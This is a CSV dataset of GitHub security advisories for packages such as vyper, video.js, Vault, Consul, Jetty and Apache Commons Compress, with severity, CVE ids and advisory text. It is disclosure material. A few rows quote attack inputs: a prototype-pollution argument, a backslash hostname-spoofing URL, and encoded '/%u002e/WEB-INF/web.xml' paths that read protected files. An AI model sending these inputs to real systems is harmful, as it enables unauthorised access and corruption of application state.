vulnerability_id,tool_id,tool_name,ghsa_id,cve_id,url,severity,published_at,summary,description,ecosystem
11,30443,vyper,GHSA-7f92-rr6w-cq64,,https://github.com/advisories/GHSA-7f92-rr6w-cq64,high,2021-08-05 16:57:42 UTC,Storage corruption due to variables overwritten by re-entrancy locks,"### Background
When attempting to use the v0.2.14 release, @pandadefi discovered an issue using the `@nonreentrant` decorator.

### Impact
Reentrancy protection storage slots get allocated to the same slots as storage variables, leading to the corruption of storage variables when using the `@nonreentrant` decorator.

### Patches
This issue was fixed in v0.2.15 in #2391, #2379

### Workarounds
Don't use the `@nonreentrant` decorator in these versions.",pip
12,17668,video.js,GHSA-pp7m-6j83-m7r6,CVE-2021-23414,https://github.com/advisories/GHSA-pp7m-6j83-m7r6,moderate,2021-08-10 16:09:36 UTC,Cross-site Scripting in video.js,"This affects the package video.js before 7.14.3.
 The src attribute of track tag allows to bypass HTML escaping and execute arbitrary code.

",npm
13,38620,org.apache.juddi:juddi-core,GHSA-9hx8-2mrv-r674,CVE-2021-37578,https://github.com/advisories/GHSA-9hx8-2mrv-r674,critical,2021-08-09 20:41:37 UTC,Deserialization of Untrusted Data in Apache jUDDI,"Apache jUDDI uses several classes related to Java's Remote Method Invocation (RMI) which (as an extension to UDDI) provides an alternate transport for accessing UDDI services.

RMI uses the default Java serialization mechanism to pass parameters in RMI invocations. A remote attacker can send a malicious serialized object to the above RMI entries. The objects get deserialized without any check on the incoming data. In the worst case, it may let the attacker run arbitrary code remotely. 

For both jUDDI web service applications and jUDDI clients, the usage of RMI is disabled by default. Since this is an optional feature and an extension to the UDDI protocol, the likelihood of impact is low. Starting with 3.3.10, all RMI related code was removed.",maven
14,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-9q94-v7ch-mxqw,CVE-2020-8867,https://github.com/advisories/GHSA-9q94-v7ch-mxqw,moderate,2021-08-02 17:35:42 UTC,Insufficient Session Expiration and TOCTOU Race Condition in OPC FOundation UA .Net Standard,This vulnerability allows remote attackers to create a denial-of-service condition on affected installations of OPC Foundation UA .NET Standard 1.04.358.30. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of sessions. The issue results from the lack of proper locking when performing operations on an object. An attacker can leverage this vulnerability to create a denial-of-service condition against the application. Was ZDI-CAN-10295.,nuget
15,22634,vault,GHSA-fp52-qw33-mfmw,CVE-2020-16250,https://github.com/advisories/GHSA-fp52-qw33-mfmw,critical,2021-08-02 17:11:41 UTC,Authentication Bypass by Spoofing and Insufficient Verification of Data Authenticity in Hashicorp Vault,"HashiCorp Vault and Vault Enterprise versions 0.7.1 and newer, when configured with the AWS IAM auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1..",go
16,34605,org.apache.sshd:sshd-core,GHSA-9279-7hph-r3xw,CVE-2021-30129,https://github.com/advisories/GHSA-9279-7hph-r3xw,high,2021-08-02 16:54:09 UTC,Buffer Overflow in Apache Mina SSHD,A vulnerability in sshd-core of Apache Mina SSHD allows an attacker to overflow the server causing an OutOfMemory error. This issue affects the SFTP and port forwarding features of Apache Mina SSHD version 2.0.0 and later versions. It was addressed in Apache Mina SSHD 2.7.0,maven
17,17207,yargs-parser,GHSA-p9pc-299p-vxgp,CVE-2020-7608,https://github.com/advisories/GHSA-p9pc-299p-vxgp,moderate,2020-09-04 18:00:54 UTC,yargs-parser Vulnerable to Prototype Pollution,"Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  
Parsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.



## Recommendation

Upgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.",npm
18,34205,org.jdom:jdom,GHSA-2363-cqg2-863c,CVE-2021-33813,https://github.com/advisories/GHSA-2363-cqg2-863c,high,2021-07-27 19:02:56 UTC,XML External Entity (XXE) Injection in JDOM,"An XXE issue in SAXBuilder in JDOM through 2.0.6 allows attackers to cause a denial of service via a crafted HTTP request.  At this time there is not released fixed version of JDOM.  As a workaround, to avoid external entities being expanded, one can call `builder.setExpandEntities(false)` and they won't be expanded.",maven
19,22634,vault,GHSA-9vh5-r4qw-v3vv,CVE-2020-7220,https://github.com/advisories/GHSA-9vh5-r4qw-v3vv,high,2021-07-28 17:57:46 UTC,Improper Resource Shutdown or Release in HashiCorp Vault,"HashiCorp Vault Enterprise 0.11.0 through 1.3.1 fails, in certain circumstances, to revoke dynamic secrets for a mount in a deleted namespace. Fixed in 1.3.2.",go
20,22315,consul,GHSA-r9w6-rhh9-7v53,CVE-2020-7955,https://github.com/advisories/GHSA-r9w6-rhh9-7v53,moderate,2021-07-28 17:57:57 UTC,Incorrect Authorization in HashiCorp Consul,"HashiCorp Consul and Consul Enterprise 1.4.1 through 1.6.2 did not uniformly enforce ACLs across all API endpoints, resulting in potential unintended information disclosure. Fixed in 1.6.3.",go
21,32068,argo,GHSA-h8jc-jmrf-9h8f,CVE-2020-8828,https://github.com/advisories/GHSA-h8jc-jmrf-9h8f,high,2021-07-26 21:19:27 UTC,Improper Authentication and Insecure Default Initialization of Resource in Argo API,"As of v1.5.0, the default admin password is set to the argocd-server pod name. For insiders with access to the cluster or logs, this issue could be abused for privilege escalation, as Argo has privileged roles. A malicious insider is the most realistic threat, but pod names are not meant to be kept secret and could wind up just about anywhere.",go
22,24240,beego/session,GHSA-f6px-w8rh-7r89,CVE-2019-16354,https://github.com/advisories/GHSA-f6px-w8rh-7r89,moderate,2021-08-02 17:15:05 UTC,Data race in Beego,The File Session Manager in Beego 1.10.0 allows local users to read session files because there is a race condition involving file creation within a directory with weak permissions.,go
23,23183,containerd,GHSA-c72p-9xmj-rx3w,CVE-2021-32760,https://github.com/advisories/GHSA-c72p-9xmj-rx3w,moderate,2021-07-26 21:17:45 UTC,Archive package allows chmod of file outside of unpack target directory,"## Impact

A bug was found in containerd where pulling and extracting a specially-crafted container image can result in Unix file permission changes for existing files in the host’s filesystem.  Changes to file permissions can deny access to the expected owner of the file, widen access to others, or set extended bits like setuid, setgid, and sticky.  This bug does not directly allow files to be read, modified, or executed without an additional cooperating process.

## Patches

This bug has been fixed in containerd 1.5.4 and 1.4.8.  Users should update to these versions as soon as they are released.  Running containers do not need to be restarted.

## Workarounds

Ensure you only pull images from trusted sources.

Linux security modules (LSMs) like SELinux and AppArmor can limit the files potentially affected by this bug through policies and profiles that prevent containerd from interacting with unexpected files.

## For more information

If you have any questions or comments about this advisory:

* [Open an issue](https://github.com/containerd/containerd/issues/new/choose)
* Email us at security@containerd.io if you think you’ve found a security bug.",go
24,16064,react-native,GHSA-7f53-fmmv-mfjv,CVE-2020-1920,https://github.com/advisories/GHSA-7f53-fmmv-mfjv,high,2021-07-20 17:33:28 UTC,Regular expression denial of service in react-native,"A regular expression denial of service (ReDoS) vulnerability in the validateBaseUrl function can cause the application to use excessive resources, become unresponsive, or crash. This was introduced in react-native version 0.59.0 and fixed in version 0.64.1.",npm
25,16781,xlsx,GHSA-g973-978j-2c3p,CVE-2021-32014,https://github.com/advisories/GHSA-g973-978j-2c3p,moderate,2021-07-22 19:47:15 UTC,Denial of Service in SheetJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (CPU consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js.,npm
26,16781,xlsx,GHSA-3x9f-74h4-2fqr,CVE-2021-32012,https://github.com/advisories/GHSA-3x9f-74h4-2fqr,moderate,2021-07-22 19:48:17 UTC,Denial of Service in SheetJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (memory consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js (issue 1 of 2).,npm
27,16781,xlsx,GHSA-8vcr-vxm8-293m,CVE-2021-32013,https://github.com/advisories/GHSA-8vcr-vxm8-293m,moderate,2021-07-22 19:48:13 UTC,Denial of Service in SheetsJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (memory consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js (issue 2 of 2).,npm
28,38629,org.owasp.antisamy:antisamy,GHSA-9c8w-jrw3-q2c3,CVE-2021-35043,https://github.com/advisories/GHSA-9c8w-jrw3-q2c3,moderate,2021-08-02 16:58:43 UTC,Cross-site Scripting in OWASP AntiSamy,OWASP AntiSamy before 1.6.4 allows XSS via HTML attributes when using the HTML output serializer (XHTML is not affected). This was demonstrated by a javascript: URL with &#00058 as the replacement for the : character.,maven
29,22315,consul,GHSA-25gf-8qrr-g78r,CVE-2021-32574,https://github.com/advisories/GHSA-25gf-8qrr-g78r,high,2021-07-19 21:21:03 UTC,Missing SSL Certificate Validation in Hashicorp Consul,HashiCorp Consul before 1.10.1 (and Consul Enterprise) has Missing SSL Certificate Validation. xds does not ensure that the Subject Alternative Name of an upstream is validated.,go
30,22315,consul,GHSA-8h2g-r292-j8xh,CVE-2021-36213,https://github.com/advisories/GHSA-8h2g-r292-j8xh,high,2021-07-19 21:21:12 UTC,L7 deny intention results in an allow action,"In HashiCorp Consul before 1.10.1 (and Consul Enterprise), xds can generate a situation where a single L7 deny intention (with a default deny policy) results in an allow action.",go
31,17237,urijs,GHSA-89gv-h8wf-cg8r,CVE-2021-3647,https://github.com/advisories/GHSA-89gv-h8wf-cg8r,moderate,2021-07-19 21:22:36 UTC,Hostname spoofing via backslashes in URL,"### Impact
If using affected versions to determine a URL's hostname, the hostname can be spoofed by using a combination of backslash (`\`) and slash (`/`) characters as part of the scheme delimiter, e.g. `scheme:/\/\/\hostname`. If the hostname is used in security decisions, the decision may be incorrect.

Depending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.

Example URL: `https:/\/\/\expected-example.com/path`
Escaped string: `https:/\\/\\/\\expected-example.com/path` (JavaScript strings must escape backslash)

Affected versions incorrectly return no hostname. Patched versions correctly return `expected-example.com`. Patched versions match the behavior of other parsers which implement the [WHATWG URL specification](https://url.spec.whatwg.org/), including web browsers and [Node's built-in URL class](https://nodejs.org/api/url.html).

### Patches
Version 1.19.7 is patched against all known payload variants.

### References
https://github.com/medialize/URI.js/releases/tag/v1.19.7 (fix for this particular bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.6 (fix for related bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.4 (fix for related bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.3 (fix for related bypass)
[PR #233](https://github.com/medialize/URI.js/pull/233) (initial fix for backslash handling)

### For more information
If you have any questions or comments about this advisory, open an issue in https://github.com/medialize/URI.js

### Reporter credit
[ready-research](https://github.com/ready-research) via https://huntr.dev/",npm
32,33995,org.eclipse.jetty:jetty-webapp,GHSA-vjv5-gp2w-65vm,CVE-2021-34429,https://github.com/advisories/GHSA-vjv5-gp2w-65vm,moderate,2021-07-19 15:15:24 UTC,Encoded URIs can access WEB-INF directory in Eclipse Jetty,"### Description
URIs can be crafted using some encoded characters to access the content of the `WEB-INF` directory and/or bypass some security constraints.
This is a variation of the vulnerability reported in [CVE-2021-28164](https://nvd.nist.gov/vuln/detail/CVE-2021-28164)/[GHSA-v7ff-8wcx-gmc5](https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5).

### Impact
The default compliance mode allows requests with URIs that contain a %u002e segment to access protected resources within the WEB-INF directory. For example, a request to `/%u002e/WEB-INF/web.xml` can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.  Similarly, an encoded null character can prevent correct normalization so that /.%00/WEB-INF/web.xml cal also retrieve the web.xml file.

### Workarounds
Some Jetty [rewrite rules](https://www.eclipse.org/jetty/documentation/jetty-9/index.html#rewrite-handler) can be deployed to rewrite any request containing encoded dot segments or null characters in the raw request URI, to a known not found resource:
```xml
<Call name=""addRule"">
  <Arg>
    <New class=""org.eclipse.jetty.rewrite.handler.RewriteRegexRule"">
      <Set name=""regex"">.*/(?:\.+/)+.*</Set>
      <Set name=""replacement"">/WEB-INF/Not-Found</Set>
    </New>
  </Arg>
</Call>
<Call name=""addRule"">
  <Arg>
    <New class=""org.eclipse.jetty.rewrite.handler.ValidUrlRule""/>
  </Arg>
</Call>
```

### Analysis
Prior to 9.4.37, Jetty was protected from this style of attack by two lines of defense:
 + URIs were decoded first and then normalized for `.` and `..` sequences. Whilst this is not according to the RFC, it did remove relative segments that were encoded or parameterized and made the resulting URI paths safe from any repeated normalization (often done by URI manipulation and file system mapping).
 + The `FileResource` class treated any difference between absolute path and canonical path of a resource as an alias, and thus the resource would not be served by default.

Prior to 9.4.37, the `FileResource` class was replaced by the `PathResource` class that did not treat normalization differences as aliases.  Then release 9.4.37 updated the URI parsing to be compliant with the RFC, in that normalization is done before decoding.   This allowed various encodings or adornments to relative path segments that would not be normalized by the pure RFC URI normalization, but were normalized by the file system, thus allowing protected resources to be accessed via an alias.  Specifically by decoding URIs after normalization, it left them vulnerable to any subsequent normalization (potentially after checking security constraints) changing the URI singificantly.  Such extra normalization is often down by URI manipulation code and file systems.

With Jetty releases 9.4.43, 10.0.6, 11.0.6, we have restored several lines of defense:
 + URIs are first decoded and then normalized which is not strictly according to the current RFC.  Since the normalization is done after decoding, the URI paths produced are safe from further normalisation and the referenced resource cannot easily be so changed after passing security constraints.
 + During URI parsing checks are made for some specific segments/characters that are possible to be seen ambiguously by an application (e.g. encode dot segments, encoded separators, empty segments, parameterized dot segments and/or null characters). So even though Jetty code handles these URIs correctly, there is a risk that an application may not do so, thus such requests are rejected with a 400 Bad Request unless a specific compliance mode is set.
 + Once decoded and normalized by initial URI processing, Jetty will not decode or normalize a received URI again within its own resource handling. This avoids to possibility of double decode attacks.
 + The `ContextHandler.getResource(String path)` method always checks that the passed path is normalized, only accepting a non normal path if approved by an AliasChecker.  This is the method that is directly used by Jetty resource serving.
 + The API methods like `ServletContext.getResource(String path)` will normalize the  prior to calling `ContextHandler.getResource(String path)`. This allows applications to use non normal paths.
 + The `PathResource` class now considers any difference in normal/canonical name between a request resource name and the found resource name  to be an alias, which will only be served if approved by an explicit `AliasChecker`

In summary, the defense is a front line of detection of specific known URI alias attacks, with the last line defense of not allowing any aliasing of resources.

Many thanks to @cangqingzhe from @CloverSecLabs for reporting this issue. ",maven
33,33967,org.apache.ant:ant,GHSA-5v34-g2px-j4fw,CVE-2021-36374,https://github.com/advisories/GHSA-5v34-g2px-j4fw,moderate,2021-08-02 16:56:31 UTC,Improper Handling of Length Parameter Inconsistency in Apache Ant,"When reading a specially crafted ZIP archive, or a derived formats, an Apache Ant build can be made to allocate large amounts of memory that leads to an out of memory error, even for small inputs. This can be used to disrupt builds using Apache Ant. Commonly used derived formats from ZIP archives are for instance JAR files and many office files. Apache Ant prior to 1.9.16 and 1.10.11 were affected.",maven
34,33967,org.apache.ant:ant,GHSA-q5r4-cfpx-h6fh,CVE-2021-36373,https://github.com/advisories/GHSA-q5r4-cfpx-h6fh,moderate,2021-08-02 16:56:17 UTC,Improper Handling of Length Parameter Inconsistency in Apache Ant,"When reading a specially crafted TAR archive an Apache Ant build can be made to allocate large amounts of memory that finally leads to an out of memory error, even for small inputs. This can be used to disrupt builds using Apache Ant. Apache Ant prior to 1.9.16 and 1.10.11 were affected.",maven
35,34003,org.apache.commons:commons-compress,GHSA-mc84-pj99-q6hh,CVE-2021-36090,https://github.com/advisories/GHSA-mc84-pj99-q6hh,high,2021-08-02 16:55:53 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted ZIP archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' zip package.",maven
36,12858,RestSharp,GHSA-9pq7-rcxv-47vq,CVE-2021-27293,https://github.com/advisories/GHSA-9pq7-rcxv-47vq,high,2021-07-14 19:10:01 UTC,Incorrect Regular Expression in RestSharp,"RestSharp < 106.11.8-alpha.0.13 uses a regular expression which is vulnerable to Regular Expression Denial of Service (ReDoS) when converting strings into DateTimes. If a server responds with a malicious string, the client using RestSharp will be stuck processing it for an exceedingly long time. Thus the remote server can trigger Denial of Service.",nuget
37,34003,org.apache.commons:commons-compress,GHSA-xqfj-vm6h-2x34,CVE-2021-35517,https://github.com/advisories/GHSA-xqfj-vm6h-2x34,high,2021-08-02 16:55:39 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted TAR archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' tar package.",maven
38,34003,org.apache.commons:commons-compress,GHSA-crv7-7245-f45f,CVE-2021-35516,https://github.com/advisories/GHSA-crv7-7245-f45f,high,2021-08-02 16:55:15 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted 7Z archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' sevenz package.",maven
39,34003,org.apache.commons:commons-compress,GHSA-7hfm-57qf-j43q,CVE-2021-35515,https://github.com/advisories/GHSA-7hfm-57qf-j43q,high,2021-08-02 16:55:07 UTC,Excessive Iteration in Compress,"When reading a specially crafted 7Z archive, the construction of the list of codecs that decompress an entry can result in an infinite loop. This could be used to mount a denial of service attack against services that use Compress' sevenz package.",maven
40,34577,org.apache.solr:solr-core,GHSA-mh7g-99w9-xpjm,CVE-2017-12629,https://github.com/advisories/GHSA-mh7g-99w9-xpjm,critical,2018-10-17 19:56:17 UTC,Remote code execution occurs in Apache Solr,"Remote code execution occurs in Apache Solr before versions 5.5.5, 6.6.2 and 7.1.0 by exploiting XXE in conjunction with use of a Config API add-listener command to reach the RunExecutableListener class. Elasticsearch, although it uses Lucene, is NOT vulnerable to this. Note that the XML external entity expansion vulnerability occurs in the XML Query Parser which is available, by default, for any query request with parameters deftype=xmlparser and can be exploited to upload malicious data to the /upload request handler or as Blind XXE using ftp wrapper in order to read arbitrary local files from the Solr server. Note also that the second vulnerability relates to remote code execution using the RunExecutableListener available on all affected versions of Solr",maven
